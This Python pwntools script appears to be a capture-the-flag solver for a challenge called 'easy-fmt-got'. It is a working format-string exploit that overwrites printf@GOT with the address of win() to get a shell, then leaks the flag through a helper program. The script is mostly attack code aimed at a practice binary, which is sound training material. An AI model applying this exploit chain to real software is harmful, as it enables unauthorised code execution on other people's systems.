#!/usr/bin/env python3
"""
easy-fmt-got — solver
================

Exploitation chain
------------------
1. Compute printf@GOT and win() address from the no-PIE binary.
2. Craft format-string payload to overwrite printf@GOT -> win.
3. Send payload, then send a trigger line so program calls win().
4. In spawned shell, run ./flag and send %1$s to leak the embedded flag.

Usage
-----
# against the remote server
python3 solve.py

# local binary (run the Docker container first, or just the compiled chall)
python3 solve.py LOCAL

# local binary with GDB attached
python3 solve.py LOCAL DEBUG
"""

from pwn import *

# ── load the binary so pwntools can resolve symbols/GOT addresses ────────────
exe = ELF("./chall", checksec=False)
context.binary = exe
context.log_level = "info"


# ── connection helper ─────────────────────────────────────────────────────────
def conn() -> tube:
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r, gdbscript="""
                b printf
                continue
            """)
        return r
    return remote("localhost", 3012)   # ← change host/port for the real event


# ── main exploit ──────────────────────────────────────────────────────────────
def main() -> None:
    r = conn()

    # banner/hint lines
    r.recvline(timeout=1)
    r.recvline(timeout=1)
    r.recvline(timeout=1)

    # ── step 1: resolve addresses from local ELF (no PIE) ─────────────────────
    printf_got = exe.got["printf"]
    win_addr = exe.symbols["win"]
    log.info(f"printf GOT @ {hex(printf_got)}")
    log.info(f"win()      @ {hex(win_addr)}")

    # ── step 2: craft format-string payload ───────────────────────────────────
    # offset = 6: the buffer is the 6th argument seen by printf on x86-64
    # write_size='short' uses %hn (2-byte) writes, keeping the payload shorter.
    offset = 6
    writes = {printf_got: win_addr}
    payload = fmtstr_payload(offset, writes, write_size="short")
    log.info(f"payload ({len(payload)} bytes): {payload[:32]}...")

    # ── step 3: send payload and trigger hijacked printf call ─────────────────
    r.sendline(payload)
    r.recvuntil(b"\n", timeout=3)
    r.sendline(b"trigger")

    # ── step 4: use shell to leak flag from execute-only helper ───────────────
    log.success("Shell should be up. Leaking flag via ./flag + %1$s")
    r.sendline(b"./flag")
    r.sendline(b"%1$s")

    leaked = r.recvline(timeout=2)
    if leaked:
        log.success(f"flag line: {leaked.strip().decode(errors='replace')}")

    # keep shell for manual interaction
    r.interactive()


if __name__ == "__main__":
    main()
